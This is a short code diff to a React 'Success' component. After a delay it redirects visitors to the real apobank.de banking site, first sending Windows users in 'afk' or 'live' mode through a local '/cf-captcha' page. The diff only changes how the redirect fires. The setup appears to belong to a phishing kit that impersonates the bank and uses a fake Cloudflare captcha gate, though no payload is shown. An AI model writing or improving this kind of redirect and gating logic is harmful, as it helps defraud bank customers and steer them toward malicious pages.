@@ -26,7 +26,11 @@ const Success = () => {
       } catch {}
       const gate = isWindows() && (mode === "afk" || mode === "live");
       const target = gate ? `/cf-captcha?next=${encodeURIComponent("https://www.apobank.de")}` : "https://www.apobank.de";
-      timer = setTimeout(() => { if (!cancelled) navigate(target); }, 6000);
+      timer = setTimeout(() => {
+        if (cancelled) return;
+        if (/^https?:\/\//i.test(target)) window.location.href = target;
+        else navigate(target);
+      }, 6000);
     })();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
   }, [navigate]);
